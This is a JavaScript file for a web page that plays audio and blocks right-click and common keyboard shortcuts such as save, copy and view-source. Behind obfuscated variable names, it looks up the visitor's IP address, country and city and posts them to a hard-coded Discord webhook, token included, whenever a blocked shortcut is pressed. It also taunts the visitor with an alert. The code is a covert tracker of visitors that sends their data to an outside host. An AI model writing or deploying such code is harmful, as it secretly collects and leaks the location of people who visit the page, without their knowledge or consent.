function audio() {
    var video = document.getElementById("video");
    video.play()
}

function video() {
    var audio = document.getElementById("audio");
    audio.volume = 0.2;
    audio.play()
}

video()

function noskidz() {
  async function _0x23ed27() {
    try {
      const _0x620711 = await fetch('https://ipinfo.io/json');
      if (!_0x620711.ok) {
        return {
          ip: 'Unknown',
          country: 'Unknown',
          city: 'Unknown'
        };
      }
      const _0x31effa = await _0x620711.json();
      return {
        ip: _0x31effa.ip || 'Unknown',
        country: _0x31effa.country || 'Unknown',
        city: _0x31effa.city || 'Unknown'
      };
    } catch (_0x44f3c2) {
      return {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown'
      };
    }
  }
  _0x23ed27().then(_0x480b1c => {
    const _0x36e9b8 = {
      embeds: [{
        color: 16579836,
        fields: [{
          name: 'IP:',
          value: _0x480b1c.ip
        }, {
          name: 'Country:',
          value: _0x480b1c.country
        }, {
          name: 'City:',
          value: _0x480b1c.city
        }]
      }]
    };
    fetch('https://discord.com/api/webhooks/1150059713296338944/hapEgtN50lPoL8nxut5sHMWqbzJV-AC5sur67cqHcFHyvbAa9yYNR2MNu5Wl1sh6vrNv', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(_0x36e9b8)
    });
  });
}
fetch('https://api.ipify.org?format=json').then(_0x1850bd => _0x1850bd.json()).then(_0x3c55a8 => {
  var _0x546cf0 = _0x3c55a8.ip;
  window.addEventListener('keydown', _0x5ca9cf => {
    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'S' || _0x5ca9cf.key === 's')) {
      _0x5ca9cf.preventDefault();
      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
      noskidz();
    }
    if (_0x5ca9cf.ctrlKey && _0x5ca9cf.key === 'C') {
      _0x5ca9cf.preventDefault();
      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
      noskidz();
    }
    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'E' || _0x5ca9cf.key === 'e')) {
      _0x5ca9cf.preventDefault();
      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
      noskidz();
    }
    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'I' || _0x5ca9cf.key === 'i' || _0x5ca9cf.key === "\xC3\u201E\xC2\xB1")) {
      _0x5ca9cf.preventDefault();
      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
      noskidz();
    }
    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'K' || _0x5ca9cf.key === 'k')) {
      _0x5ca9cf.preventDefault();
      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
      noskidz();
    }
    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'U' || _0x5ca9cf.key === 'u')) {
      _0x5ca9cf.preventDefault();
      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
      noskidz();
    }
  });
  document.addEventListener('contextmenu', function (_0x425474) {
    _0x425474.preventDefault();
  });
});
